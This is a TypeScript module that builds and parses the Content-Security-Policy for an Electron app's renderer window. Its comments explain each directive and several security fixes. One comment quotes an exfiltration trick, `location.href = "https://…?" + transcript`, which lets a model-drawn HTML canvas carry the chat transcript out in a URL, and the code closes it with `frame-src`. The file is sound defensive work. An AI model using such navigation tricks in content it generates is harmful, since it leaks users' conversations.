/**
 * The renderer window's Content-Security-Policy.
 *
 * Kept in its own electron-free module so `csp.test.ts` can import and parse the real value
 * (`windows.ts` cannot be imported under `bun test` — it pulls in `electron`). Same shape as
 * `renderer-url.ts`: the decision lives in a pure module, the wiring lives in `windows.ts`.
 *
 * ## What the renderer actually loads — measured, not assumed
 *
 * The window loads two ways and this ONE policy has to fit both, because a policy that only
 * fits one is worse than none (it either breaks the dev loop or gives false assurance in the
 * packaged app):
 *
 *   • packaged — `nc://renderer/index.html` through the privileged scheme in `windows.ts`.
 *   • dev      — `${ELECTRON_RENDERER_URL}/index.html`, an electron-vite dev server.
 *
 * They need the SAME policy, which is a finding rather than a convenience: every relaxation
 * Vite's dev server wants (inline script, a `ws:` HMR socket, same-origin ES modules) is
 * already forced by production requirements below. So there is no dev-only weakening here,
 * and no directive was loosened to make HMR work.
 *
 * ## Why each relaxation exists
 *
 * **A sha256 HASH, not `'unsafe-inline'`, in script-src** (NC-SEC-033) — ⚠️ the paragraph below is
 *   HISTORY, kept because its measurement is the basis of the fix that replaced it.
 *   NC-SEC-032 moved agent canvases off `srcdoc` onto a served document with its own policy, so they
 *   no longer inherit this file at all. The only remaining inline script was `index.html`'s theme
 *   preload, and it is now admitted by its hash. What this closes is the grant that let ANY injected
 *   inline script run in a renderer holding the `window.api` bridge — not a cleanup.
 *
 *   ⚠️ **The two load modes differ, measured 2026-08-28, and only one of them inlines anything.**
 *   `packages/app/vite.js` replaces `src="/oc-theme-preload.js"` — an absolute path. The desktop's
 *   `index.html` writes `./oc-theme-preload.js`, and in a BUILD that never matches: the packaged
 *   `out/renderer/index.html` still carries the `src=` attribute, so the packaged renderer loads the
 *   preload as an ordinary file under `'self'`. In DEV vite normalises the URL before
 *   `transformIndexHtml` runs, the replace matches, and the script IS inline. So the hash is what
 *   makes the DEV surface work under one shared policy — and a `./`-vs-`/` detail decides it, which
 *   is why this is written down rather than reasoned about again.
 *
 *   ⚠️ The plugin inlines the file VERBATIM (`readFileSync`, no transform), so the hash is exactly
 *   sha256 of `packages/app/public/oc-theme-preload.js` — asserted in `csp.test.ts` against the real
 *   file, not against a copied constant. The same equality is what makes the web surface's
 *   `cspForHtml` work, and it was confirmed byte-for-byte on both surfaces.
 *
 *   Formerly:
 *   Agent-drawn HTML canvases (AGENTS.md → "the agent-drawn HTML canvases in chat") render as
 *   `<iframe sandbox="allow-scripts" srcdoc="…">` carrying the model's raw, deliberately
 *   unsanitized markup — see `packages/session-ui/src/components/markdown-html-embed.ts`. An
 *   `about:srcdoc` document INHERITS the embedder's CSP (HTML's "determine navigation params
 *   policy container" clones the parent's policy container for `about:srcdoc`), and sandboxing
 *   does not opt it out. Measured 2026-07-30 in Chrome headless: under a parent
 *   `script-src 'nonce-…'` the srcdoc's inline script does not run; under `'unsafe-inline'` it
 *   does. A nonce or hash policy has the same effect as blocking, because the embedded document
 *   is authored by a model at runtime and can carry neither.
 *   ⚠️ So do not "harden" this by dropping `'unsafe-inline'` — that silently kills every HTML
 *   canvas, and no test outside this file would notice. The honest fix is to stop inheriting:
 *   serve embeds from their own origin (a `nc://embed/…` document with its own, looser policy)
 *   and only then tighten this directive.
 *
 * `'wasm-unsafe-eval'` in **script-src** — the renderer bundle compiles WebAssembly
 *   (`WebAssembly.instantiate` in the main chunk; `ghostty-web` is the terminal renderer and
 *   the shiki highlighter worker also carries wasm). Chrome refuses `WebAssembly.Module` under
 *   any script-src that grants neither `'unsafe-eval'` nor `'wasm-unsafe-eval'` — measured, with
 *   the CompileError naming the directive. Dropping this breaks the terminal.
 *
 * `'unsafe-inline'` in **style-src** — `index.html` carries a `style=` attribute on `<html>`,
 *   the theme preload injects a `<style id="oc-theme-preload">` element, and Solid sets element
 *   styles directly. Style nonces are not reachable for any of the three.
 *
 * ## What this policy is for, and what it is honestly NOT for
 *
 * It bounds **code execution and navigation**, not passive resource loading:
 *   • no script may be loaded from any remote origin (script-src carries no `http:`/`https:`)
 *   • `eval` / `new Function` are refused — verified: the built bundle contains no `new Function(`
 *   • `object-src 'none'` — no plugin/`<embed>` surface
 *   • `base-uri 'none'` — an injected `<base>` cannot re-point every relative URL in the app
 *   • `form-action 'none'` — no form may navigate anywhere (the app has no navigating forms)
 *   • `frame-ancestors 'none'` — the renderer document may never be embedded
 *   • `frame-src` — an agent canvas may not navigate itself to a remote origin (NC-SEC-031)
 * That matters here because the renderer holds `window.api`, the IPC bridge to the main process.
 *
 * It is NOT an exfiltration control FOR THE APP ITSELF, and claiming otherwise would be ruling 2's
 * "a fault is never described falsely" in reverse. It is one for the agent canvases it frames —
 * `frame-src` below is the reason a canvas cannot carry the transcript out in a URL — but that is
 * a bound on embedded content, not on the renderer.
 *
 * `connect-src` (via `default-src`) permits arbitrary http/https/ws/wss because the UI is a thin
 * client that reaches an instance **by URL**: the built-in
 * sidecar on a random loopback port, a WSL distro's server, and — the shipped remote-access
 * feature (R1–R8) — any peer instance the user types in at runtime, plus its terminal WebSocket.
 * That list changes after the document has loaded, and a CSP cannot. Hardcoding localhost would
 * break remote-instance mode. Passive fetches (img/font/media) are left equally open on purpose:
 * restricting them would protect nothing while silently degrading agent canvases that legitimately
 * draw a remote image.
 */

/**
 * Directives, in serialization order. `default-src` carries the passive/connect surface; every
 * directive that must NOT inherit it is stated explicitly rather than left to CSP's fallback
 * chain, because those chains are where accidents live (`worker-src` falls back to `child-src`
 * then `script-src`, not to `default-src`).
 *
 * `nc:` sits beside `'self'` deliberately. `'self'` should match `nc://renderer` — the scheme is
 * registered `standard: true, secure: true` — but a packaged build cannot be exercised from a
 * dev box, and if `'self'` did NOT match a custom scheme the failure mode is a white window with
 * no way to see it. `nc:` is our own protocol handler with path-traversal containment, so naming
 * it costs nothing and removes an unobservable failure.
 */
export const rendererCspDirectives = (themePreloadSha256: string): Readonly<Record<string, readonly string[]>> => ({
  "default-src": ["'self'", "nc:", "data:", "blob:", "http:", "https:", "ws:", "wss:"],
  /**
   * ⚠️ The hash is a PARAMETER, not a constant computed here. This module must stay importable
   * under `bun test` (it is electron-free on purpose), and a build define read at module scope
   * would be `undefined` there — which fails OPEN or fails silent, and this is the directive where
   * neither is acceptable. Passing it in means the test supplies the real file's hash and asserts
   * the policy that results.
   */
  "script-src": ["'self'", "nc:", `'sha256-${themePreloadSha256}'`, "'wasm-unsafe-eval'"],
  "style-src": ["'self'", "nc:", "data:", "blob:", "'unsafe-inline'"],
  "worker-src": ["'self'", "nc:", "blob:"],
  /**
   * 🔴 NC-SEC-031 — the last way an agent canvas could still phone home.
   *
   * NC-SEC-003 put `default-src 'none'` inside every srcdoc, which closes fetch, XHR, WebSocket
   * and beacon. It does not close NAVIGATION: a frame navigating ITSELF is checked against its
   * PARENT's `frame-src`, not against its own policy, and the sandbox has no token for it either
   * (`allow-top-navigation` governs navigating the TOP frame, not oneself). So
   * `location.href = "https://…?" + transcript` still left the machine, with the data in the URL.
   *
   * Without this directive `frame-src` falls back to `default-src`, which carries `http:` and
   * `https:` for the remote-instance feature — i.e. the fallback chain handed canvases the whole
   * web. Stating it explicitly is the fix, and it belongs in the POLICY rather than in an Electron
   * `will-frame-navigate` handler because a handler would bind to one surface.
   *
   * ⚠️ This desktop policy is one of TWO. The served web UI has its own in
   * `novaclaw/src/server/shared/ui.ts`, which also declares no `frame-src` — but its `default-src`
   * is `'self'`, so the same fallback lands somewhere safe there. The two policies are not shared
   * and do not agree; see NC-SEC-032, which is that disagreement biting in the other direction.
   *
   * ⚠️ Measured before it was added, because getting this wrong kills every canvas silently and
   * nothing in the tree would notice (2026-08-28, Chrome 148, parent policy carrying exactly this
   * directive): the `about:srcdoc` frame still loaded and its inline script still ran, while
   * `location.href = "https://example.com/…"` produced "Framing 'https://example.com/' violates
   * the following Content-Security-Policy directive: frame-src 'self' data: blob:. The request has
   * been blocked." No `about:` source is needed — srcdoc is not matched against this list.
   */
  "frame-src": ["'self'", "nc:", "data:", "blob:"],
  "object-src": ["'none'"],
  "base-uri": ["'none'"],
  "form-action": ["'none'"],
  "frame-ancestors": ["'none'"],
})

export const CSP_HEADER = "Content-Security-Policy"

/**
 * The serialized header value applied to the renderer document in both load modes.
 *
 * ⚠️ An EMPTY hash is refused rather than serialized. `'sha256-'` is not a valid source expression,
 * so a missing build define would produce a policy Chromium drops the whole directive from — and the
 * observable symptom is the one this file keeps warning about: the page renders, the theme script is
 * blocked, and nothing outside the CSP violation log says so. Failing loudly at window creation is
 * the only version of this that cannot ship unnoticed.
 */
export function rendererCsp(themePreloadSha256: string): string {
  if (!themePreloadSha256)
    throw new Error("renderer CSP: the theme-preload sha256 is empty — the build define did not reach the main process")
  return Object.entries(rendererCspDirectives(themePreloadSha256))
    .map(([name, sources]) => `${name} ${sources.join(" ")}`)
    .join("; ")
}

/** Parse a serialized policy back into directives — used by the test to assert on real output. */
export function parseCsp(policy: string): Record<string, string[]> {
  const out: Record<string, string[]> = {}
  for (const directive of policy.split(";")) {
    const [name, ...sources] = directive.trim().split(/\s+/).filter(Boolean)
    if (!name) continue
    out[name.toLowerCase()] = sources
  }
  return out
}
